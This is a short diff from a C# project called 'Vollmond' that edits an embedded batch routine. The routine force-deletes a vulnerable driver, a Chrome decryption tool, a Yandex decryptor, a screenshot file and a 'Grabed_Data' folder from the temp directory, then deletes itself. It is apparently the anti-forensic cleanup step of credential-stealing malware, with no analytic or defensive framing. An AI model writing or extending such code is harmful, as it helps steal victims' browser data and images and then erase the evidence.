@@ -20,7 +20,7 @@ namespace Vollmond
                 del /q /f "{Path.Combine(tempPath, "vulndriver.sys")}"
                 del /q /f "{Path.Combine(tempPath, "chromelevator_x64.exe")}"
                 del /q /f "{Path.Combine(tempPath, "YandexDecryptor.exe")}"
-                del /q /f "{Path.Combine(tempPath, "webcam_screenshot.jpg")}"
+                del /q /f "{Path.Combine(tempPath, "screenshot.jpg")}"
                 rmdir /q  /s "{Path.Combine(tempPath, "Grabed_Data")}"
 
                 (goto) 2>nul & del "%~f0"
